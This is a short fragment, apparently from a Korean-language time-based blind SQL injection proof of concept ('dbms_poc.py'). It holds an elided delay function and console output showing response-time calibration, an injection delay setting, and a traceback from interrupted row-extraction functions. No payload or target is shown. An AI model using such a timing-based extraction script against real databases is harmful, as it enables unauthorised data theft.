...
def _delay():
    ...
    print(f'[*] 요청 대기 시간: {sleep_duration:.3f} 초')  # 대기 시간 표시
...
C:\frida_scripts>python dbms_poc.py
[*] 평균 응답 시간 계산 중...
[*] 평균 응답 시간: 0.002 초
[*] 주입 대기 시간 설정: 0.009 초
[*] 요청 대기 시간: 0.526 초
...
Traceback (most recent call last):
  File "C:\frida_scripts\dbms_poc.py", line 168, in <module>
    _get_all_rows(args.output_file)
  File "C:\frida_scripts\dbms_poc.py", line 142, in _get_all_rows
    length = _get_row_length(i)
             ^^^^^^^^^^^^^^^^^^
  File "C:\frida_scripts\dbms_poc.py", line 124, in _get_row_length
    if _get_resp_time(params) > _time_to_sleep:
       ^^^^^^^^^^^^^^^^^^^^^^
  File "C:\frida_scripts\dbms_poc.py", line 59, in _get_resp_time
    sleep(0.1)
KeyboardInterrupt
^C
